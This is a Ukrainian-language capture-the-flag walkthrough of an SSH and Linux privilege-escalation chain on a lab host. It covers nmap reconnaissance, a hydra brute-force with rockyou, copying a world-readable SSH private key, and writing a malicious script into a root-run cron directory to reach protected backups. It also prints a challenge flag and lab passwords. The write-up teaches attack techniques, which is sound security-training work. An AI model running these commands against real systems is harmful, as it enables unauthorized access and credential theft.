# Задача 3: SSH / Linux Privilege Escalation — рішення покроково

Ланцюжок: **veronica → michael → steve → root**.
Усі команди — у WSL (Linux у Windows) або будь-якому Linux-терміналі.

---

## Крок 0. Підготовка

### WSL (Linux у Windows)
```powershell
wsl --install
```
Детально: https://learn.microsoft.com/en-us/windows/wsl/install
(На Windows також знадобиться Git за потреби: https://git-scm.com/install/windows)

### Інструменти
```bash
sudo apt update
sudo apt install -y nmap hydra wget
```
- `nmap` — сканер портів (що відкрито на сервері).
- `hydra` — підбір паролів (brute-force).
- `wget` — завантаження файлів з інтернету.

### Словник паролів rockyou
`rockyou.txt` — найвідоміший список злитих паролів, стандарт для підбору.
```bash
wget https://github.com/praetorian-inc/Hob0Rules/raw/master/wordlists/rockyou.txt.gz
gunzip rockyou.txt.gz     # gunzip = розпакувати .gz
wc -l rockyou.txt         # wc -l = порахувати рядки (має бути ~14 млн)
```

---

## Крок 1. Розвідка — що відкрито на сервері

```bash
nmap -sV -F 10.0.31.207
```
- `-sV` = визначити версії сервісів.
- `-F` = швидкий скан (тільки топ-100 портів).

Результат: відкрито тільки **порт 22 (SSH)**. Отже єдиний вектор — SSH.

---

## Крок 2. Вхід під veronica (підбір пароля)

Спершу пробуємо вручну найпростіші паролі:
```bash
ssh veronica@10.0.31.207
```
`ssh <користувач>@<сервер>` — підключення до сервера.

Якщо руками не вгадали — brute-force через hydra:
```bash
hydra -l veronica -P rockyou.txt -t 4 -f ssh://10.0.31.207
```
- `-l veronica` = логін (один).
- `-P rockyou.txt` = список паролів.
- `-t 4` = 4 паралельні спроби (більше SSH ріже).
- `-f` = зупинитись, щойно знайде пару.

Пароль виявився `blink182`. Заходимо всередину.

> **Альтернатива з PowerShell** (якщо без WSL): `Enter-PSSession -ComputerName
> 10.0.31.207 -Credential veronica` — але для цієї задачі зручніший SSH.

---

## Крок 3. Розвідка всередині + пошук шляху далі

Дивимось, у яких ми групах і що доступно:
```bash
id                    # хто ми, у яких групах
ls -la /backups       # ← Permission denied, тека закрита
```

Знаходимо цільовий файл, але він теж закритий:
```bash
ls -la ~/sales_shortcut/team_lead/team_credentials.txt
# -rw-rw---- 1 sysadmin michael ... — читати може тільки група michael
```
veronica не в групі michael → треба **стати michael**.

Шукаємо SSH-ключ michael (типова помилка — ключ із відкритими правами):
```bash
ls -la /home/michael/.ssh/
cat /home/michael/.ssh/id_rsa    # ключ читається! права -rw-r--r--
```
`id_rsa` — приватний SSH-ключ. Якщо він читається чужим користувачем — це діра.

---

## Крок 4. Стаємо michael (вхід по ключу)

Копіюємо ключ michael до себе в WSL (командою `scp` — копіювання по SSH):
```bash
cd ~
scp veronica@10.0.31.207:/home/michael/.ssh/id_rsa ./michael_key
```
(введеш пароль veronica — `blink182`)

Заходимо цим ключем:
```bash
chmod 600 michael_key                       # SSH вимагає суворі права на ключ
ssh -i michael_key michael@10.0.31.207       # -i = вхід по ключу, не паролю
```
`chmod 600` = дозволити читання/запис лише власнику (інакше SSH відмовиться).

Тепер читаємо цільовий файл (ми в групі michael):
```bash
cat /home/veronica/sales_shortcut/team_lead/team_credentials.txt
```
Усередині — прапор + паролі команди:
```
flag:manag3y0urkeyzs3cure1y
steve:19pinkfloyd65
joanna:zhadanisobaky13
```
**Прапор частини 2** — рядок `flag:...` у форматі `UR{...}`.

> Урок: `hydra` на michael НЕ спрацювала б — сервер для нього приймає тільки
> ключі, не паролі (`does not support password authentication`). Тому шукали
> ключ, а не брутили пароль.

---

## Крок 5. Аналіз для підвищення до root

Заходимо під steve (пароль уже маємо):
```bash
ssh steve@10.0.31.207          # пароль: 19pinkfloyd65
```

Дивимось, чому `/backups` закрита і як піднятись:
```bash
ls -ld /backups                        # власник sysadmin, права drwx------
find / -perm -4000 -type f 2>/dev/null # SUID-бінарники (потенційний privesc)
cat /etc/crontab                       # заплановані задачі
ls -la /etc/cron.d/                    # додаткові крон-задачі
```

Знаходимо нестандартну крон-задачу `/etc/cron.d/gather_metrics`:
```
* * * * * root for script in /work/procurement/scripts/*.sh; do
          [ -f "$script" ] && /bin/bash "$script"; done
```
Розшифровка: **щохвилини від root** виконуються ВСІ `.sh` файли з теки
`/work/procurement/scripts/`. А steve (у групі `procurement`) може туди писати!

> **Крон** (cron) = планувальник задач у Linux. Запис `* * * * *` = "щохвилини".
> Якщо root запускає скрипт із теки, куди ми можемо писати — це шлях до root.

---

## Крок 6. Отримуємо root через крон

Кладемо свій скрипт, який скопіює `/backups` у доступне місце й відкриє права:
```bash
cat > /work/procurement/scripts/mm.sh << 'EOF'
#!/bin/bash
cp -a /backups /tmp/bk 2>/dev/null
chmod -R 755 /tmp/bk 2>/dev/null
chown -R steve:steve /tmp/bk 2>/dev/null
EOF
chmod +x /work/procurement/scripts/mm.sh
```
- `cat > файл << 'EOF' ... EOF` = створити файл із текстом між EOF.
- `cp -a` = скопіювати зі збереженням прав.
- `chown` = змінити власника (виконається від root, тож спрацює).

Чекаємо ~1 хвилину (поки крон спрацює) і перевіряємо:
```bash
ls -la /tmp/bk/
```
Зʼявляється:
```
summary_sales_01_01.csv.bak
summary_sales_01_02.csv.bak
summary_sales_01_03.csv.bak   ← бекап за 01.03
```

Читаємо цільовий файл:
```bash
cat /tmp/bk/summary_sales_01_03.csv.bak
```
Усередині — прапор **частини 3** у форматі `UR{...}`.

> Гарний тон в аудиті — прибрати за собою: `rm /work/procurement/scripts/mm.sh`

---

## Загальні уроки з цієї задачі

1. **Розвідка спочатку** (`nmap`): зрозуміти, що взагалі відкрито, перш ніж діяти.
2. **Слабкі паролі** підбираються за секунди (`hydra` + `rockyou.txt`).
3. **Права доступу до файлів — критичні.** Приватний ключ із правами
   `-rw-r--r--` (читає будь-хто) = повний провал безпеки.
4. **Не брутити наосліп:** якщо SSH каже "password authentication not supported"
   — шукай ключ, а не пароль. Економить години.
5. **Cron privilege escalation** — класика: root запускає скрипт із теки, куди
   може писати звичайний користувач → цей користувач отримує root.
6. **Ланцюжок доступів:** реальні атаки — це не один "чарівний" експлойт, а
   послідовність дрібних недбалостей, кожна веде на крок глибше.
